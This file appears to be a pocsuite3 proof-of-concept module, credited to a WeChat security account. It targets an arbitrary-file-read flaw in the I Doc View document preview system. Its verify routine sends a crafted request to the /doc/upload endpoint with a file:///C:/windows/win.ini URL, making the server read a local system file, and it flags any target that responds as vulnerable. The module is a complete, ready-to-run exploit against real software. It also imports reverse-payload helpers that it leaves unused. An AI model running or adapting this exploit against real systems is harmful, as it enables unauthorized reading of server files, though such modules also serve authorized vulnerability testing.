# _*_ coding:utf-8 _*_
# @Time : 2023/12/20 20:52
# @Author: 为赋新词强说愁
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str


class U8CRM(POCBase):
    pocDesc = '''I Doc View在线文档预览系统任意文件读取漏洞'''
    vulID = '20231220'
    version = '1'
    author = '公众号网络安全透视镜'
    vulDate = '2023-12-20'
    createDate = '2023-12-20'
    updateDate = '2023-12-20'
    name = 'I Doc View在线文档预览系统任意文件读取漏洞'
    appName = 'I Doc View'

    def _verify(self):

        result = {}
        url = self.url + '/doc/upload?token=testtoken&url=file:///C:/windows/win.ini&name=test.txt'
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate',
            'DNT': '1',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1',
        }

        payload = """
             http://127.0.0.1/doc/upload?token=testtoken&url=file:///C:/windows/win.ini&name=test.txt
        """

        try:

            response = requests.get(url, headers=headers)
            text = response.text
            if response.status_code == 200 and 'srcUrl' in text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['payload'] = payload

            return self.parse_output(result)
        except Exception as e:
            pass


register_poc(U8CRM)